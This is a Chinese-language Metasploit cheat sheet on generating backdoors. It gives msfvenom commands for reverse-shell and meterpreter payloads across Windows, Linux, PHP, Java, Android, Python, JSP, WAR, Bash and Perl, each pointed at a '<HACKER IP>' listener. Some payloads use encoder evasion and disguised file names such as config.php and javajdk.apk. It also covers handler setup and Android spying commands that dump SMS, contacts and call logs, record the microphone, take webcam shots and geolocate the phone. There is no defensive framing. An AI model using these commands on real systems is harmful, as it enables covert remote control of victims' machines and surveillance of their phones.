# msf生成各种后门

>  后门植入思路：生成后门->上传后门->目标机wget->运行后门程序

### 生成Windows后门

```msf
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=<HACKER IP> LPORT=<HACKER PORT> -b "\x00" -e x86/shikata_ga_nai -i 7 -f exe -o /opt/wins.exe
```

### 生成linux后门

```msf
msfvenom -p linux/x86/meterpreter/reverse_tcp --platform windows linux LHOST=<HACKER IP> LPORT=<HACKER PORT> -f elf > /opt/hat
```

msfconsole中配置

```msf
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost,lport
exploit
```

### 生成PHP后门

```msf
msfvenom -p php/meterpreter/reverse_tcp LHOST=<HACKER IP> LPORT=<HACKER PORT> -f raw >config.php
```

msfconsole中配置

```msf
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost,lport
exploit
```

目标机运行

```cmd
php ./config.php
```

### 生成Java后门

```msf
msfvenom -p java/meterpreter/reverse_tcp LHOST=<HACKER IP> LPORT=<HACKER PORT> -o /opt/JavaBean.jar
```

msfconsole中配置

```msf
use exploit/multi/handler
set payload java/meterpreter/reverse_tcp
set lhost,lport
exploit
```

目标机运行

```msf
java -jar ./JavaBean.jar
```

### 生成Android后门

```msf
msfvenom -p android/meterpreter/reverse_tcp LHOST=<HACKER IP> LPORT=<HACKER PORT> R > /root/javajdk.apk
```

msfconsole中配置

```msf
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost,lport
exploit
```

常用操作

```msf
check_root    #查看是否root
dump_calllog    #下载通讯记录
dump_contacts   #下载联系人
dump_sms    #下载短信
send_sms    #发送短信
record_mic    #录音
webcam_list   #查看手机摄像头
webcam_snap   #拍照
webcam_stream   #连续拍照
geolocate   #获取目标地理位置
upload    #上传文件到手机
download    #下载手机上的文件
shell   #进入手机的bash shell
```
### Python后门

```msf
msfvenom -p cmd/unix/reverse_python LHOST=<HACKER IP> LPORT=<HACKER PORT> -f raw > shell.py
```

### JSP后门

```msf
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<HACKER IP> LPORT=<HACKER PORT> -f raw > /opt/action.jsp
```

### war后门

```msf
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<HACKER IP> LPORT=<HACKER PORT> -f war > web.war
```


### Bash后门

```msf
msfvenom -p cmd/unix/reverse_bash LHOST=<HACKER IP> LPORT=<HACKER PORT> -f raw > bash.sh 
```

### Perl后门

```msf
msfvenom -p cmd/unix/reverse_perl LHOST=<HACKER IP> LPORT=<HACKER PORT> -f raw > perl.pl
```

